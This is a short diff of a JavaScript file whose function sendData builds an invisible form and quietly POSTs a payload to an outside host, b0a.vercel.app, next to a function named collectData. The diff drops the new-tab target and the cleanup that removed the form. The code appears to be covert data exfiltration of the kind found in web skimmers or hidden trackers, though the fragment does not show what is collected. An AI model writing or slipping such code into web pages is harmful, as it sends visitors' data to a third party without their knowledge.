@@ -27,7 +27,6 @@ function sendData(payload) {
   var form = document.createElement('form');
   form.method = 'POST';
   form.action = 'https://b0a.vercel.app/';
-  form.target = '_blank';
   form.style.display = 'none';
   
   var input = document.createElement('input');
@@ -37,7 +36,6 @@ function sendData(payload) {
   
   document.body.appendChild(form);
   form.submit();
-  document.body.removeChild(form);
 }
 
 function collectData() {
